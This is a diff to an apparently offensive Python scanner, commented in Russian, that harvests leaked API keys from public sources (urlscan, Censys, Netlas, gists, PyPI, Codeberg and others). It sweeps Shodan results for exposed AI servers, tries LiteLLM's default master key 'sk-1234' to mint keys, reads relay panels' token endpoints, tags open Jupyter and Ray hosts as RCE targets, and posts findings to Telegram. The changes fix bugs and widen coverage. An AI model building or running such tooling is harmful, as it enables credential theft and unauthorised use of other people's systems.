                                 if t:
-                                    out.append((t, "fofa:" + host))
+                                    out.append((t, "fofa:" + u))
+                                    break  # схема сработала — вторую не дёргаем
                             except Exception:
                                 continue
             except Exception:
@@ -3616,22 +4404,19 @@ class LocalFiles(Source):
                             )
                         ):
                             fp = os.path.join(root, fn)
-                            if os.path.getsize(fp) > 50_000_000:
-                                continue
                             try:
-                                out.append(
-                                    (
-                                        open(
-                                            fp, encoding="utf-8", errors="replace"
-                                        ).read(),
-                                        fp,
-                                    )
-                                )
+                                # getsize ВНУТРИ try (было: файл пропал между
+                                # walk и getsize = весь fetch падает)
+                                if os.path.getsize(fp) > 50_000_000:
+                                    continue
+                                with open(fp, encoding="utf-8", errors="replace") as fh:
+                                    out.append((fh.read(), fp))
                             except Exception:
                                 continue
             elif os.path.exists(p):
                 try:
-                    out.append((open(p, encoding="utf-8", errors="replace").read(), p))
+                    with open(p, encoding="utf-8", errors="replace") as fh:
+                        out.append((fh.read(), p))
                 except Exception:
                     continue
         return out
@@ -3654,7 +4439,13 @@ class URLScan(Source):
                 domains = [r.get("domain") for r in json.load(f) if r.get("domain")]
         except Exception:
             pass
-        queries = ["page.url:%s" % d for d in domains[:10]]
+        # АУДИТ-фикс: domains[:10] — фиксированное окно; ротация по 15 мин,
+        # иначе релеи за первой десяткой никогда не сканировались
+        if len(domains) > 10:
+            _rot = int(time.time() // 900)
+            _st = (_rot * 10) % len(domains)
+            domains = [domains[(_st + i) % len(domains)] for i in range(10)]
+        queries = ["page.url:%s" % d for d in domains]
         queries += [
             "page.url:*.top AND page.url:console",
             "page.url:*.top AND page.url:token",
@@ -3699,6 +4490,49 @@ class URLScan(Source):
                         r2.close() if hasattr(r2, "close") else None
                     except Exception:
                         continue
+                    # result-JSON: тела ПОДРЕСУРСОВ (js/.env/json) — ключи живут
+                    # там, DOM их не содержит (было: не тянули вообще)
+                    try:
+                        r3 = http(
+                            "GET",
+                            "https://urlscan.io/api/v1/result/%s/" % uuid,
+                            timeout=(10, 40),
+                            headers={"API-Key": CFG["urlscan_key"]},
+                        )
+                        if r3 is not None and r3.status_code == 200:
+                            reqs = ((r3.json().get("data") or {}).get("requests")) or []
+                            for req in reqs[:40]:
+                                resp = req.get("response") or {}
+                                # мелкие текстовые ответы — кандидаты на ключи
+                                body = resp.get("body") or ""
+                                if (
+                                    body
+                                    and len(body) < 800_000
+                                    and any(
+                                        m in body
+                                        for m in (
+                                            "sk-",
+                                            "AIza",
+                                            "api_key",
+                                            "API_KEY",
+                                            "oat01",
+                                            "Bearer ",
+                                        )
+                                    )
+                                ):
+                                    out.append(
+                                        (
+                                            body[:800_000],
+                                            "urlscan-res:%s"
+                                            % str(
+                                                req.get("request", {}).get(
+                                                    "url", page_url
+                                                )
+                                            )[:120],
+                                        )
+                                    )
+                    except Exception:
+                        pass
             except Exception:
                 continue
         return out
@@ -3863,10 +4697,14 @@ class Censys(Source):
                         continue
                     addr = "%s:%s" % (ip, port)
                     # тело HTTP-сервиса (если есть) — в чанки на извлечение ключей
-                    http = svc.get("http") or {}
-                    resp = http.get("response") or {}
-                    body = str(resp.get("body") or resp.get("html") or "")
-                    if body:
+                    # (было: http-переменная шла строкой-дампом всего dict)
+                    http_svc = svc.get("http") or {}
+                    resp = http_svc.get("response") or {}
+                    if isinstance(resp, str):
+                        body = resp  # бывает готовой строкой
+                    else:
+                        body = str(resp.get("body") or resp.get("html") or "")
+                    if body and body != "{}":
                         out.append((body, "censys:%s" % addr))
                     if port and addr not in endpoints:
                         endpoints[addr] = {"ts": time.time(), "src": "censys"}
@@ -4010,7 +4848,7 @@ class Netlas(Source):
 
     def _save_state(self, st):
         try:
-            json.dump(st, open(self.STATE_PATH, "w", encoding="utf-8"))
+            _atomic_json_dump(self.STATE_PATH, st)
         except Exception:
             pass
 
@@ -4064,7 +4902,16 @@ class Netlas(Source):
                     timeout=(12, 30),
                     verify=False,
                 )
-                st["used"] += 1
+                # бюджет считаем ТОЛЬКО по успешным ответам (было: 429/5xx
+                # сжигали дневной кап 46 — при пустом результате в остаток дня)
+                if r.status_code == 200:
+                    st["used"] += 1
+                elif r.status_code == 429:
+                    # АУДИТ-фикс: раньше sleep(2) и ДАЛЬШЕ по IP в разнос —
+                    # вторичный rate-limit только крепчал. Стопаем источник
+                    # до следующего цикла.
+                    log("  [netlas] 429 rate-limit — стоп до след. цикла")
+                    break
                 if r.status_code != 200:
                     continue
                 items = r.json().get("items") or []
@@ -4078,11 +4925,14 @@ class Netlas(Source):
                         continue
                     addr = "%s:%s" % (ip, port)
                     out.append((body, "netlas:%s" % addr))
-                    if "setup_token" in body or "sk-ant-oat01" in body:
+                    # cc-sweep-эндпоинт: ЛЮБОЙ отвечающий порт (было: только
+                    # с setup_token — большинство портов не доходило до файла)
+                    if addr not in endpoints:
                         endpoints[addr] = {
                             "ts": time.time(),
                             "body": body[:500],
                         }
+                time.sleep(1)  # free-tier ~1rps
             except Exception:
                 continue
 
@@ -4173,6 +5023,7 @@ class FourChan(Source):
                                     txt = htmllib.unescape(re.sub(r"<[^>]+>", " ", com))
                                     if len(txt) > 30:
                                         out.append((txt, "4chan:/%s/%d" % (board, no)))
+                        time.sleep(1)  # 4cdn: 1 rps иначе cloudflare-ban
                     except Exception:
                         continue
             except Exception:
@@ -4199,6 +5050,8 @@ class PullPush(Source):
     )
 
     _rot = 0  # ротация запросов между циклами
+    _rot_sub = 0  # независимая ротация сабов (было: та же rot % 6 — из 8
+    # сабов опрашивались только 4: rot всегда 0/3 -> SUBS[2],[5],[6],[7] мёртвы)
 
     QUERIES = (
         '"sk-ant-api03"',
@@ -4215,8 +5068,10 @@ class PullPush(Source):
         rot = PullPush._rot
         PullPush._rot = (rot + 3) % len(self.QUERIES)
         qbatch = [self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(3)]
-        # 2 саба за цикл (тоже ротация)
-        sub_batch = [self.SUBS[(rot + i) % len(self.SUBS)] for i in range(2)]
+        # 2 саба за цикл — СВОЯ ротация (шаг +2, взаимно простой с len)
+        srot = PullPush._rot_sub
+        PullPush._rot_sub = (srot + 2) % len(self.SUBS)
+        sub_batch = [self.SUBS[(srot + i) % len(self.SUBS)] for i in range(2)]
         try:
             for q in qbatch:
                 for kind in ("submission", "comment"):
@@ -4322,7 +5177,13 @@ class NpmRegistry(Source):
 
         for name in pkgs[:30]:
             try:
-                r = http("GET", "https://registry.npmjs.org/%s" % name, timeout=(8, 15))
+                # scoped пакеты: @scope/pkg -> %2f (было: сырой слеш = 404,
+                # весь scoped-класс молча пропадал)
+                r = http(
+                    "GET",
+                    "https://registry.npmjs.org/%s" % name.replace("/", "%2f"),
+                    timeout=(8, 15),
+                )
                 if r.status_code != 200:
                     continue
                 j = r.json()
@@ -4406,7 +5267,12 @@ class WaybackHunt(Source):
                         doms.append(d)
         except Exception:
             pass
-        doms = doms[:15]  # wayback медленный
+        # АУДИТ-фикс: было doms[:15] — новые релеи (файл дополняется
+        # append'ом) никогда не попадали в окно. Вращаем по 15 мин.
+        if len(doms) > 15:
+            _rot = int(time.time() // 900)
+            _st = (_rot * 15) % len(doms)
+            doms = [doms[(_st + i) % len(doms)] for i in range(15)]
         for dom in doms:
             try:
                 r = http(
@@ -4421,12 +5287,15 @@ class WaybackHunt(Source):
                 if not rows or len(rows) < 2:
                     continue
                 for row in rows[1:]:
-                    url = row[1] if len(row) > 1 else ""
+                    # CDX поля: urlkey, timestamp, original, ... — URL это [2],
+                    # а [1] это timestamp (было перепутано -> источник молчал)
+                    ts_snap = row[1] if len(row) > 1 else "2026"
+                    url = row[2] if len(row) > 2 else ""
                     if any(k in url.lower() for k in self.INTERESTING):
-                        # тянем архивную копию
+                        # тянем архивную копию (реальный timestamp снапшота)
                         try:
                             t, _ = fetch_text(
-                                "https://web.archive.org/web/2026/%s" % url,
+                                "https://web.archive.org/web/%s/%s" % (ts_snap, url),
                                 (10, 30),
                                 400_000,
                             )
@@ -4498,6 +5367,10 @@ class DockerHub(Source):
         return self._out
 
     def _token(self, repo):
+        # official images без неймспейса -> library/<name> (было: token 401 /
+        # manifest 404, весь класс официальных образов молча пропадал)
+        if "/" not in repo:
+            repo = "library/" + repo
         try:
             r = http(
                 "GET",
@@ -4633,8 +5506,9 @@ class GistSearch(Source):
     def fetch(self):
         out = []
         headers = {}
-        if gh_token():
-            headers["Authorization"] = "Bearer " + gh_token()
+        _gtok = gh_token()  # один слот ротации на весь fetch (было: x2 вызов)
+        if _gtok:
+            headers["Authorization"] = "Bearer " + _gtok
         for q in self.QUERIES:
             try:
                 r = http(
@@ -4650,6 +5524,27 @@ class GistSearch(Source):
                     r'href="/([A-Za-z0-9_\-]+/([0-9a-f]{20,32}))"', r.text
                 )
                 for full, gid in gids[:15]:
+                    # multi-file гисты: /raw отдаёт только ПЕРВЫЙ файл —
+                    # через API берём ВСЕ файлы (ключи часто во втором+)
+                    got = False
+                    if _gtok:
+                        try:
+                            rg = http(
+                                "GET",
+                                "https://api.github.com/gists/%s" % gid,
+                                timeout=(6, 12),
+                                headers=headers,
+                            )
+                            if rg is not None and rg.status_code == 200:
+                                for fn, fd in (rg.json().get("files") or {}).items():
+                                    content = (fd or {}).get("content")
+                                    if content:
+                                        out.append((content, "gist:%s#%s" % (full, fn)))
+                                        got = True
+                        except Exception:
+                            pass
+                    if got:
+                        continue
                     try:
                         t, _ = fetch_text(
                             "https://gist.githubusercontent.com/%s/raw" % full,
@@ -4767,7 +5662,7 @@ class PyPITarballs(Source):
 
     def fetch(self):
         out = []
-        import tarfile, io
+        import tarfile, io, zipfile
 
         # актуальные версии через /json
         for name in self.BASE_PKGS:
@@ -4776,51 +5671,70 @@ class PyPITarballs(Source):
                 if r is None or r.status_code != 200:
                     continue
                 j = r.json()
+                # sdist (.tar.gz) ИЛИ wheel (.whl) — многие пакеты только wheel
                 urls = [
                     u
                     for u in (j.get("urls") or [])
-                    if u.get("url", "").endswith(".tar.gz")
+                    if u.get("url", "").endswith((".tar.gz", ".whl"))
                 ]
                 if not urls:
                     continue
+                # предпочитаем sdist (исходники полнее), иначе wheel
+                urls.sort(key=lambda u: 0 if u["url"].endswith(".tar.gz") else 1)
                 r2 = http("GET", urls[0]["url"], timeout=(10, 30))
                 if r2 is None or r2.status_code != 200:
                     continue
                 buf = io.BytesIO(r2.content)
+                is_whl = urls[0]["url"].endswith(".whl")
                 try:
-                    with tarfile.open(fileobj=buf, mode="r:gz") as tf:
-                        for member in tf.getmembers()[:80]:
-                            if not member.name.endswith(
-                                (".py", ".cfg", ".env", ".toml", ".ini", ".txt")
+                    if is_whl:
+                        archive = zipfile.ZipFile(buf)
+                        members = [archive.getinfo(n) for n in archive.namelist()[:120]]
+
+                        def read_one(m):
+                            return archive.read(m.filename)
+                    else:
+                        archive = tarfile.open(fileobj=buf, mode="r:gz")
+                        members = archive.getmembers()[:120]
+
+                        def read_one(m):
+                            fd = archive.extractfile(m)
+                            return fd.read() if fd else b""
+
+                    for member in members:
+                        mname = member.filename if is_whl else member.name
+                        if not mname.endswith(
+                            (".py", ".cfg", ".env", ".toml", ".ini", ".txt")
+                        ):
+                            continue
+                        if member.size > 300_000:
+                            continue
+                        try:
+                            content = read_one(member).decode("utf-8", "replace")
+                            if any(
+                                k in content
+                                for k in (
+                                    "sk-",
+                                    "api_key",
+                                    "API_KEY",
+                                    "apiKey",
+                                    "gsk_",
+                                    "hf_",
+                                    "AIza",
+                                    "xoxb-",
+                                    "ghp_",
+                                    "glpat-",
+                                )
                             ):
-                                continue
-                            if member.size > 300_000:
-                                continue
-                            fd = tf.extractfile(member)
-                            if not fd:
-                                continue
-                            try:
-                                content = fd.read().decode("utf-8", "replace")
-                                if any(
-                                    k in content
-                                    for k in (
-                                        "sk-",
-                                        "api_key",
-                                        "API_KEY",
-                                        "apiKey",
-                                        "gsk_",
-                                        "hf_",
+                                out.append(
+                                    (
+                                        content,
+                                        "pypi:%s/%s" % (name, mname.split("/")[-1]),
                                     )
-                                ):
-                                    out.append(
-                                        (
-                                            content,
-                                            "pypi:%s/%s"
-                                            % (name, member.name.split("/")[-1]),
-                                        )
-                                    )
-                            except Exception:
-                                continue
+                                )
+                        except Exception:
+                            continue
+                    archive.close()
                 except Exception:
                     continue
             except Exception:
@@ -4840,7 +5754,7 @@ class StackOverflow(Source):
             '"sk-proj-" api key',
             "leaked openai key",
             '"api key" claude accidentally',
-            "intitle:api key posted",
+            "api key posted",  # intitle: — не API-синтаксис, матчился литералом
         ):
             try:
                 r = http(
@@ -4852,7 +5766,15 @@ class StackOverflow(Source):
                 )
                 if r is None or r.status_code != 200:
                     continue
-                for it in (r.json().get("items") or [])[:15]:
+                j = r.json()
+                # backoff: SE банит игнорирующих (было: капали без пауз)
+                try:
+                    bo = int(j.get("backoff") or 0)
+                    if bo:
+                        time.sleep(bo)
+                except Exception:
+                    pass
+                for it in (j.get("items") or [])[:15]:
                     body = it.get("body") or ""
                     title = it.get("title") or ""
                     if body or title:
@@ -4860,6 +5782,7 @@ class StackOverflow(Source):
                             re.sub(r"<[^>]+>", " ", body + " " + title)
                         )
                         out.append((txt, "so:%s" % it.get("question_id")))
+                time.sleep(1)
             except Exception:
                 continue
         return out
@@ -4901,6 +5824,31 @@ class Codeberg(Source):
                                 break
                         except Exception:
                             continue
+                    # contents API: жирные файлы в корне (.env, config.*, keys.*)
+                    # — ключи НЕ в README (было: только README = упускали всё)
+                    try:
+                        rc = http(
+                            "GET",
+                            "https://codeberg.org/api/v1/repos/%s/contents" % full,
+                            timeout=(8, 15),
+                        )
+                        if rc is not None and rc.status_code == 200:
+                            for ent in (rc.json() or [])[:40]:
+                                fn = str(ent.get("name") or "").lower()
+                                if not re.search(
+                                    r"^(\.env|.*\.env|config\.(json|ya?ml|py)|"
+                                    r"keys?\.|secrets?\.|credentials|tokens?\.)",
+                                    fn,
+                                ):
+                                    continue
+                                du = ent.get("download_url")
+                                if not du:
+                                    continue
+                                t2, _ = fetch_text(du, (6, 12), 200_000)
+                                if t2:
+                                    out.append((t2, "codeberg-file:%s/%s" % (full, fn)))
+                    except Exception:
+                        pass
             except Exception:
                 continue
         return out
@@ -4978,6 +5926,9 @@ class GitHubEvents(Source):
                                 headers=headers,
                             )
                             fetched += 1
+                            if r2.status_code == 403:
+                                return out  # rate-limit: дальше всё будет 403 —
+                            # не жжём цикл впустую (было: continue по всем эвентам)
                             if r2.status_code != 200:
                                 continue
                             for f in (r2.json().get("files") or [])[:8]:
@@ -5172,7 +6123,13 @@ class RelayBoards(Source):
                 return None
             if r.status_code >= 500:
                 return None
-            base = (r.url or ("https://" + domain)).split("/?")[0].rstrip("/")
+            # чистый scheme://netloc (было: split("/?") оставлял путь/квери,
+            # если редирект на /login?next=/ — кривой api_base)
+            try:
+                _pu = urlparse(r.url or ("https://" + domain))
+                base = "%s://%s" % (_pu.scheme or "https", _pu.netloc or domain)
+            except Exception:
+                base = "https://" + domain
             res = {
                 "domain": domain,
                 "alive": True,
@@ -5277,7 +6234,12 @@ class RelayBoards(Source):
                     base + "/api/token/?p=0&size=10", timeout=(10, 20), verify=False
                 )
                 if r4.status_code == 200 and r4.json().get("success"):
-                    items = ((r4.json().get("data") or {}).get("items")) or []
+                    d4 = r4.json().get("data")
+                    # new-api варианты: data = {"items":[...]} ИЛИ data = [...]
+                    if isinstance(d4, list):
+                        items = d4
+                    else:
+                        items = ((d4 or {}).get("items")) or []
                     if items:
                         key = items[0].get("key")
         except Exception:
@@ -5409,39 +6371,52 @@ class Lemmy(Source):
 
 
 def _merge_relay_hosts(hosts, src):
-    """Добавить найденные relay-домены в relay_boards.json (для RelayScanner)."""
+    """Добавить найденные relay-домены в relay_boards.json (для RelayScanner).
+    Под LOCK: read-modify-write гонялся из нескольких источников параллельно
+    (потерянные записи). Плюс валидация: чистый домен, без схемы/порта."""
     if not hosts:
         return 0
     path = os.path.join(HERE, "relay_boards.json")
-    rows = []
-    try:
-        rows = json.load(open(path, encoding="utf-8"))
-    except Exception:
+    with LOCK:
         rows = []
-    known = {r.get("domain") for r in rows if isinstance(r, dict)}
-    added = 0
-    for h in hosts:
-        if h not in known:
-            rows.append(
-                {
-                    "domain": h,
-                    "alive": True,
-                    "framework": "discovered:%s" % src,
-                    "name": None,
-                    "api_base": "https://" + h,
-                }
-            )
-            known.add(h)
-            added += 1
-    if added:
         try:
-            json.dump(
-                rows, open(path, "w", encoding="utf-8"), ensure_ascii=False, indent=1
-            )
-            log("  [%s] +%d relay-доменов в relay_boards.json" % (src, added))
+            rows = json.load(open(path, encoding="utf-8"))
         except Exception:
-            pass
-    return added
+            rows = []
+        known = {r.get("domain") for r in rows if isinstance(r, dict)}
+        added = 0
+        for h in hosts:
+            # валидация: отрезаем схему/порт/путь (было: в файл попадали
+            # "https://host:8080/x" -> api_base "https://https://host:8080/x")
+            h = str(h or "").strip().lower()
+            h = re.sub(r"^https?://", "", h)
+            h = h.split("/")[0].split(":")[0].strip()
+            if not h or not re.match(r"^[a-z0-9.\-]+\.[a-z]{2,}$", h):
+                continue
+            if h not in known:
+                rows.append(
+                    {
+                        "domain": h,
+                        "alive": True,
+                        "framework": "discovered:%s" % src,
+                        "name": None,
+                        "api_base": "https://" + h,
+                    }
+                )
+                known.add(h)
+                added += 1
+        if added:
+            try:
+                json.dump(
+                    rows,
+                    open(path, "w", encoding="utf-8"),
+                    ensure_ascii=False,
+                    indent=1,
+                )
+                log("  [%s] +%d relay-доменов в relay_boards.json" % (src, added))
+            except Exception:
+                pass
+        return added
 
 
 def _relay_base_domains():
@@ -5458,6 +6433,15 @@ def _relay_base_domains():
     return list(dict.fromkeys(doms))
 
 
+def _rot12(doms, window=12):
+    """Ротационное окно по доменам релеев (было: фиксированные первые 12 —
+    домены 13+ не сканировались ВООБЩЕ). Окно сдвигается каждые 10 минут."""
+    if len(doms) <= window:
+        return doms
+    off = (int(time.time() // 600) * window) % len(doms)
+    return (doms[off:] + doms[:off])[:window]
+
+
 class CrtSh(Source):
     """crt.sh (Certificate Transparency): субдомены api./llm./gpt. у relay-доменов
     -> новые релеи для RelayScanner (open /api/channel = чужие ключи)."""
@@ -5467,7 +6451,7 @@ class CrtSh(Source):
     def fetch(self):
         out = []
         found = set()
-        for dom in _relay_base_domains()[:12]:
+        for dom in _rot12(_relay_base_domains()):
             try:
                 r = http(
                     "GET",
@@ -5500,7 +6484,7 @@ class RapidDNS(Source):
     def fetch(self):
         out = []
         found = set()
-        for dom in _relay_base_domains()[:12]:
+        for dom in _rot12(_relay_base_domains()):
             try:
                 t, code = fetch_text(
                     "https://rapiddns.io/subdomain/%s?full=1" % dom, (12, 30), 700_000
@@ -5567,7 +6551,11 @@ class HFDatasets(Source):
                     if time.time() >= deadline:
                         break
                     fn = s.get("rfilename", "")
-                    if not self.FILE_RE.search(fn) or fn.startswith("."):
+                    # .env/.env.production в КОРНЕ — самые жирные файлы;
+                    # старый fn.startswith(".") выкидывал именно их
+                    if not self.FILE_RE.search(fn) or (
+                        fn.startswith(".") and not fn.startswith(".env")
+                    ):
                         continue
                     t, _ = fetch_text(
                         "https://huggingface.co/datasets/%s/raw/main/%s" % (ds, fn),
@@ -5607,13 +6595,21 @@ class OpenInfraSweep(Source):
         ('http.title:"Dify"', "dify"),
         ('http.title:"Gradio"', "gradio"),
         ('http.title:"FastChat"', "fastchat"),
+        # relay-панели (жирнейший класс — каналы с апстрим-ключами внутри):
+        ('http.html:"new-api"', "newapi"),
+        ('http.title:"New API"', "newapi"),
+        ('http.html:"one-api"', "newapi"),
+        ('http.title:"One API"', "newapi"),
+        # TLS-инстансы litellm (раньше мимо: пробовали только http://)
+        ('http.html:"litellm" port:443', "litellm"),
+        ('http.html:"LiteLLM Proxy"', "litellm"),
     ]
     PER_CYCLE = 4
 
-    def _rec(self, addr, kind, tier, models, genkey=None):
+    def _rec(self, addr, kind, tier, models, genkey=None, scheme="http"):
         return {
             "key": genkey or ("open://" + addr),
-            "base": "http://%s/v1" % addr,
+            "base": "%s://%s/v1" % (scheme, addr),
             "tag": "open-infra",
             "origin": "open-infra:%s:%s" % (kind, addr),
             "ts": time.time(),
@@ -5630,7 +6626,24 @@ class OpenInfraSweep(Source):
         }
 
     def _probe(self, addr, kind):
-        base = "http://%s" % addr
+        """Обе схемы: https первой на TLS-портах (было: только http:// — все
+        TLS-only инстансы (443/8443) молча пролетали мимо)."""
+        port = addr.rsplit(":", 1)[-1]
+        schemes = (
+            ("https", "http") if port in ("443", "8443", "9443") else ("http", "https")
+        )
+        for scheme in schemes:
+            responded, rec = self._probe_scheme(addr, kind, scheme)
+            if rec is not None:
+                return rec
+            if responded:
+                break  # сервис ответил на этой схеме, но контент не наш — вторую не терзаем
+        return None
+
+    def _probe_scheme(self, addr, kind, scheme):
+        """-> (responded: bool, rec|None). responded=False = схема мертва."""
+        base = "%s://%s" % (scheme, addr)
+        dead = [False]  # схема не отвечает вообще
 
         def _get(p, to=(4, 8)):
             try:
@@ -5641,32 +6654,40 @@ class OpenInfraSweep(Source):
         try:
             if kind == "ollama":
                 r = _get("/api/tags")
-                if r is not None and r.status_code == 200:
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
                     models = [
                         m.get("name", "?") for m in (r.json().get("models") or [])
                     ]
-                    return self._rec(
+                    return True, self._rec(
                         addr,
                         kind,
                         "Ollama OPEN (free GPU): %s" % ", ".join(models[:8]),
                         models,
+                        scheme=scheme,
                     )
-            elif kind in ("vllm", "openwebui", "fastchat", "dify"):
+            elif kind in ("vllm", "openwebui", "fastchat", "dify", "newapi"):
                 r = _get("/v1/models")
-                if r is not None and r.status_code == 200:
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
                     data = r.json().get("data") or []
                     models = [m.get("id", "?") for m in data if isinstance(m, dict)]
                     if models:
-                        return self._rec(
+                        return True, self._rec(
                             addr,
                             kind,
                             "%s OPEN /v1/models: %s" % (kind, ", ".join(models[:8])),
                             models,
+                            scheme=scheme,
                         )
             elif kind == "litellm":
                 models = []
                 r = _get("/v1/models")
-                if r is not None and r.status_code == 200:
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
                     data = r.json().get("data") or []
                     models = [m.get("id", "?") for m in data if isinstance(m, dict)]
                 # АНТИ-ФЕЙК: реальный LiteLLM 400-ит на неизвестную модель,
@@ -5688,7 +6709,7 @@ class OpenInfraSweep(Source):
                         and rb.status_code == 200
                         and '"choices"' in (rb.text or "")
                     ):
-                        return None  # фейк-ферма — пропускаем
+                        return True, None  # фейк-ферма — пропускаем
                 except Exception:
                     pass
                 # классика мисконфига: дефолтный master_key sk-1234
@@ -5703,56 +6724,96 @@ class OpenInfraSweep(Source):
                     if r2.status_code == 200 and str(
                         r2.json().get("key") or ""
                     ).startswith("sk-"):
-                        return self._rec(
+                        return True, self._rec(
                             addr,
                             kind,
                             "LiteLLM DEFAULT MASTER sk-1234 -> ключ сгенерён!",
                             models,
                             r2.json()["key"],
+                            scheme=scheme,
                         )
                 except Exception:
                     pass
                 if models:
-                    return self._rec(addr, kind, "LiteLLM OPEN /v1/models", models)
+                    return True, self._rec(
+                        addr, kind, "LiteLLM OPEN /v1/models", models, scheme=scheme
+                    )
             elif kind == "jupyter":
                 r = _get("/api")
-                if r is not None and r.status_code == 200:
-                    return self._rec(
-                        addr, kind, "Jupyter OPEN (RCE: /terminals + /api/contents)", []
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr,
+                        kind,
+                        "Jupyter OPEN (RCE: /terminals + /api/contents)",
+                        [],
+                        scheme=scheme,
                     )
             elif kind == "ray":
                 r = _get("/api/jobs/")
-                if r is not None and r.status_code == 200:
-                    return self._rec(
-                        addr, kind, "Ray Dashboard OPEN (RCE: job submission)", []
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr,
+                        kind,
+                        "Ray Dashboard OPEN (RCE: job submission)",
+                        [],
+                        scheme=scheme,
                     )
             elif kind == "comfyui":
                 r = _get("/system_stats")
-                if r is not None and r.status_code == 200:
-                    return self._rec(addr, kind, "ComfyUI OPEN (free GPU imagegen)", [])
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr,
+                        kind,
+                        "ComfyUI OPEN (free GPU imagegen)",
+                        [],
+                        scheme=scheme,
+                    )
             elif kind == "mlflow":
                 r = _get("/api/2.0/mlflow/experiments/list")
-                if r is not None and r.status_code == 200:
-                    return self._rec(
-                        addr, kind, "MLflow OPEN (experiments/datasets)", []
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr,
+                        kind,
+                        "MLflow OPEN (experiments/datasets)",
+                        [],
+                        scheme=scheme,
                     )
             elif kind == "databricks":
                 r = _get("/api/2.0/clusters/list")
-                if r is not None and r.status_code == 200:
-                    return self._rec(addr, kind, "Databricks OPEN workspace", [])
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr, kind, "Databricks OPEN workspace", [], scheme=scheme
+                    )
             elif kind == "gradio":
                 r = _get("/info")
-                if r is not None and r.status_code == 200:
-                    return self._rec(addr, kind, "Gradio OPEN app", [])
+                if r is None:
+                    dead[0] = True
+                elif r.status_code == 200:
+                    return True, self._rec(
+                        addr, kind, "Gradio OPEN app", [], scheme=scheme
+                    )
         except Exception:
-            return None
-        return None
+            return False, None
+        return (not dead[0]), None
 
     def fetch(self):
-        keys = Shodan()._key_pool()
+        # живой пул с фолбэком (было: keys[0] — сдох = источник молчит весь цикл)
+        keys = Shodan()._alive_pool(Shodan()._key_pool())
         if not keys:
             return []
         out = []
+        _oi_skip = {}  # счётчик тихих скипов постинга по kind
+        _oi_batch = {}  # kind -> [rec] — сводный пост вместо N подряд
         cyc = int(time.time() // 600)
         start = (cyc * self.PER_CYCLE) % len(self.QUERIES)
         qbatch = [
@@ -5763,25 +6824,55 @@ class OpenInfraSweep(Source):
             known = json.load(open(known_path, encoding="utf-8"))
         except Exception:
             known = {}
+        # ПРУНИНГ + НЕГАТИВНЫЙ КЭШ: позитивы живут 30д, негативы (трупы) 3д.
+        # Раньше негативы не писались вообще — мёртвые хосты перепроверялись
+        # каждые ~30 минут вечно (и есть причина затухания источника).
+        _now = time.time()
+        known = {
+            k: v
+            for k, v in known.items()
+            if _now - (v.get("ts") or 0)
+            < (3 * 86400 if k.startswith("neg:") else 30 * 86400)
+        }
         for q, kind in qbatch:
             page = (cyc % 5) + 1
+            r = None
+            for sk in keys:
+                try:
+                    r = requests.get(
+                        "https://api.shodan.io/shodan/host/search",
+                        params={"key": sk, "query": q, "page": page},
+                        timeout=(10, 25),
+                        verify=False,
+                    )
+                    if r.status_code == 429:
+                        time.sleep(3)
+                        r = None
+                        continue
+                    if r.status_code != 200:
+                        r = None
+                    break
+                except Exception:
+                    r = None
+                    break
+            if r is None:
+                continue
             try:
-                r = requests.get(
-                    "https://api.shodan.io/shodan/host/search",
-                    params={"key": keys[0], "query": q, "page": page},
-                    timeout=(10, 25),
-                    verify=False,
-                )
-                if r.status_code != 200:
-                    continue
                 targets = []
                 for m in (r.json().get("matches") or [])[:40]:
                     addr = "%s:%s" % (m.get("ip_str"), m.get("port"))
-                    if ("open-infra:%s:%s" % (kind, addr)) not in known:
+                    okey = "open-infra:%s:%s" % (kind, addr)
+                    if okey not in known and ("neg:" + okey) not in known:
                         targets.append(addr)
                 with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-                    for res in ex.map(lambda a: self._probe(a, kind), targets):
+                    for addr, res in zip(
+                        targets, ex.map(lambda a: self._probe(a, kind), targets)
+                    ):
                         if not res:
+                            # негативный кэш: труп помечаем, 3 дня не дёргаем
+                            known["neg:open-infra:%s:%s" % (kind, addr)] = {
+                                "ts": time.time()
+                            }
                             continue
                         known[res["origin"]] = {"ts": time.time(), "tier": res["tier"]}
                         store(res)
@@ -5799,21 +6890,44 @@ class OpenInfraSweep(Source):
                         )
                         rce_kind = kind in ("jupyter", "ray")
                         if star_hit or rce_kind:
-                            try:
-                                post_telegram(
-                                    "🆓 OPEN-INFRA [%s]\n🌐 %s\n%s"
-                                    % (kind, res["base"], res["tier"])
-                                )
-                            except Exception:
-                                pass
+                            # МАСТЕР-КЛЮЧИ litellm — индивидуальные посты
+                            # (это алмазы). Остальное — в БАТЧ: одно сводное
+                            # сообщение на kind за fetch (было: 8 постов подряд
+                            # от одного ray-забега = TG-спам).
+                            if kind == "litellm" and str(
+                                res.get("key") or ""
+                            ).startswith("sk-"):
+                                try:
+                                    post_telegram(
+                                        "🆓 OPEN-INFRA [%s]\n🌐 %s\n%s"
+                                        % (kind, res["base"], res["tier"])
+                                    )
+                                except Exception:
+                                    pass
+                            else:
+                                _oi_batch.setdefault(kind, []).append(res)
                         else:
-                            log("  ⏭ пропущен постинг: %s без фронтир-моделей" % kind)
+                            # тихий скип: один счётчик на цикл вместо
+                            # 40 одинаковых строк в логе
+                            _oi_skip[kind] = _oi_skip.get(kind, 0) + 1
             except Exception:
                 continue
         try:
-            json.dump(known, open(known_path, "w", encoding="utf-8"))
+            _atomic_json_dump(known_path, known)
         except Exception:
             pass
+        if _oi_skip:
+            log(
+                "  [open-infra] тихо скипнуто постинга (не фронтир): %s"
+                % ", ".join("%s x%d" % kv for kv in sorted(_oi_skip.items()))
+            )
+        # батч-постинг: одно сводное сообщение на kind (анти-спам ray/jupyter)
+        for kind, items in _oi_batch.items():
+            try:
+                hosts = "\n".join("🌐 %s" % x["base"] for x in items[:8])
+                post_telegram("🆓 OPEN-INFRA [%s] x%d\n%s" % (kind, len(items), hosts))
+            except Exception:
+                pass
         return out
 
 
@@ -6036,6 +7150,9 @@ class NewApiSweep(Source):
     )
